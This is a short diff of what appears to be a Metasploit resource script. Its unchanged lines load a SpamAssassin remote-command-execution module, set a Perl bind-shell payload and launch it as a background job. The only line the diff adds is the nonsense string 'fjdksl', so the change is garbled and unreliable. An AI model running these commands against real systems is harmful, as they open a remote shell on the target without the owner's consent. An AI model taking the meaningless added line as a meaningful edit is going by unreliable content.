@@ -30,3 +30,4 @@ run -j
 use exploit/unix/misc/spamassassin_exec
 set PAYLOAD cmd/unix/bind_perl
 run -j
+fjdksl
